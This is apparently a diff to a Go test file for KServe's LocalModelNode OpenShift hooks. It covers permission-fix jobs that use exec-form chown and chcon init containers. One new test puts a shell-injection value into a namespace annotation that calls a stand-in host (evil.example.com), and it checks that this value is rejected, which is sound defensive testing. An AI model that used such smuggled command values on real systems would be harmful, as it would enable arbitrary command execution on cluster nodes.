@@ -192,7 +192,7 @@ var _ = Describe("LocalModelNode OCP platform hooks", func() {
 			Expect(job.Spec.Template.Spec.ServiceAccountName).To(Equal("kserve-localmodelnode-agent"))
 		})
 
-		It("Should create permission fix job when filesystem is not writable", func() {
+		It("Should create permission fix job with exec-form init containers when filesystem is not writable", func() {
 			ctx, cancel := context.WithCancel(context.Background())
 			DeferCleanup(cancel)
 
@@ -265,8 +265,21 @@ var _ = Describe("LocalModelNode OCP platform hooks", func() {
 			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")
 
 			job := &jobs.Items[0]
-			command := job.Spec.Template.Spec.Containers[0].Command[2]
-			Expect(command).To(ContainSubstring("-l s0:c28,c27"))
+
+			// Verify exec-form init containers
+			Expect(job.Spec.Template.Spec.InitContainers).To(HaveLen(2))
+			fixOwnership := job.Spec.Template.Spec.InitContainers[0]
+			Expect(fixOwnership.Name).To(Equal("fix-ownership"))
+			Expect(fixOwnership.Command[0]).To(Equal("chown"))
+
+			fixSelinux := job.Spec.Template.Spec.InitContainers[1]
+			Expect(fixSelinux.Name).To(Equal("fix-selinux"))
+			Expect(fixSelinux.Command).To(ContainElement("-l"))
+			Expect(fixSelinux.Command).To(ContainElement("s0:c28,c27"))
+
+			// Verify main container is log-success
+			Expect(job.Spec.Template.Spec.Containers).To(HaveLen(1))
+			Expect(job.Spec.Template.Spec.Containers[0].Name).To(Equal("log-success"))
 
 			// Reset writable for cleanup
 			fsMock.writable = true
@@ -353,7 +366,146 @@ var _ = Describe("LocalModelNode OCP platform hooks", func() {
 			}
 			err := k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
 			Expect(err).ShouldNot(HaveOccurred())
-			Expect(fixJobs.Items).To(HaveLen(0), "No permission fix jobs should exist when filesystem is writable")
+			Expect(fixJobs.Items).To(BeEmpty(), "No permission fix jobs should exist when filesystem is writable")
+		})
+
+		It("Should run chcon without -l flag when no MCS level is present", func() {
+			ctx, cancel := context.WithCancel(context.Background())
+			DeferCleanup(cancel)
+
+			fsMock = &mockFileSystem{
+				subDirs:  []os.DirEntry{},
+				writable: false,
+			}
+			fsHelper = fsMock
+
+			configMap := &corev1.ConfigMap{
+				ObjectMeta: metav1.ObjectMeta{
+					Name:      constants.InferenceServiceConfigMapName,
+					Namespace: constants.KServeNamespace,
+				},
+				Data: configs,
+			}
+			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
+			defer k8sClient.Delete(ctx, configMap)
+
+			nodeName = "worker-no-mcs"
+			node := &corev1.Node{
+				ObjectMeta: metav1.ObjectMeta{
+					Name:   nodeName,
+					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
+				},
+				Status: corev1.NodeStatus{
+					Conditions: []corev1.NodeCondition{
+						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
+					},
+				},
+			}
+			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
+			defer k8sClient.Delete(ctx, node)
+
+			localModelNode := &v1alpha1.LocalModelNode{
+				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
+				Spec: v1alpha1.LocalModelNodeSpec{
+					LocalModels: []v1alpha1.LocalModelInfo{},
+				},
+			}
+			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
+			defer k8sClient.Delete(ctx, localModelNode)
+
+			jobs := &batchv1.JobList{}
+			fixLabels := map[string]string{
+				"fix-permissions": "true",
+				"node":            nodeName,
+			}
+			Eventually(func() bool {
+				err := k8sClient.List(ctx, jobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
+				return err == nil && len(jobs.Items) == 1
+			}, timeout, interval).Should(BeTrue(), "Permission fix job should be created")
+
+			job := &jobs.Items[0]
+			fixSelinux := job.Spec.Template.Spec.InitContainers[1]
+			Expect(fixSelinux.Command).NotTo(ContainElement("-l"),
+				"chcon should not use -l flag when no MCS level is present")
+
+			fsMock.writable = true
+		})
+
+		It("Should reject invalid MCS level from namespace annotation", func() {
+			ctx, cancel := context.WithCancel(context.Background())
+			DeferCleanup(cancel)
+
+			fsMock = &mockFileSystem{
+				subDirs:  []os.DirEntry{},
+				writable: false,
+			}
+			fsHelper = fsMock
+
+			// Patch namespace with an invalid MCS level (injection attempt)
+			existingNs := &corev1.Namespace{}
+			Expect(k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, existingNs)).Should(Succeed())
+			patch := client.MergeFrom(existingNs.DeepCopy())
+			if existingNs.Annotations == nil {
+				existingNs.Annotations = map[string]string{}
+			}
+			existingNs.Annotations["openshift.io/sa.scc.mcs"] = "s0:c1,c2 ; curl http://evil.example.com #"
+			Expect(k8sClient.Patch(ctx, existingNs, patch)).Should(Succeed())
+			defer func() {
+				ns := &corev1.Namespace{}
+				_ = k8sClient.Get(ctx, types.NamespacedName{Name: modelCacheNamespace}, ns)
+				p := client.MergeFrom(ns.DeepCopy())
+				delete(ns.Annotations, "openshift.io/sa.scc.mcs")
+				_ = k8sClient.Patch(ctx, ns, p)
+			}()
+
+			configMap := &corev1.ConfigMap{
+				ObjectMeta: metav1.ObjectMeta{
+					Name:      constants.InferenceServiceConfigMapName,
+					Namespace: constants.KServeNamespace,
+				},
+				Data: configs,
+			}
+			Expect(k8sClient.Create(ctx, configMap)).NotTo(HaveOccurred())
+			defer k8sClient.Delete(ctx, configMap)
+
+			nodeName = "worker-invalid-mcs"
+			node := &corev1.Node{
+				ObjectMeta: metav1.ObjectMeta{
+					Name:   nodeName,
+					Labels: map[string]string{"node.kubernetes.io/instance-type": "gpu"},
+				},
+				Status: corev1.NodeStatus{
+					Conditions: []corev1.NodeCondition{
+						{Type: corev1.NodeReady, Status: corev1.ConditionTrue},
+					},
+				},
+			}
+			Expect(k8sClient.Create(ctx, node)).Should(Succeed())
+			defer k8sClient.Delete(ctx, node)
+
+			localModelNode := &v1alpha1.LocalModelNode{
+				ObjectMeta: metav1.ObjectMeta{Name: nodeName},
+				Spec: v1alpha1.LocalModelNodeSpec{
+					LocalModels: []v1alpha1.LocalModelInfo{},
+				},
+			}
+			Expect(k8sClient.Create(ctx, localModelNode)).Should(Succeed())
+			defer k8sClient.Delete(ctx, localModelNode)
+
+			// The reconciler should error due to invalid MCS, no fix job should be created
+			fixJobs := &batchv1.JobList{}
+			fixLabels := map[string]string{
+				"fix-permissions": "true",
+				"node":            nodeName,
+			}
+			// Wait a bit and ensure NO permission fix job is created
+			Consistently(func() int {
+				_ = k8sClient.List(ctx, fixJobs, client.InNamespace(modelCacheNamespace), client.MatchingLabels(fixLabels))
+				return len(fixJobs.Items)
+			}, time.Second*3, interval).Should(Equal(0),
+				"No permission fix job should be created with invalid MCS level")
+
+			fsMock.writable = true
 		})
 	})
 })
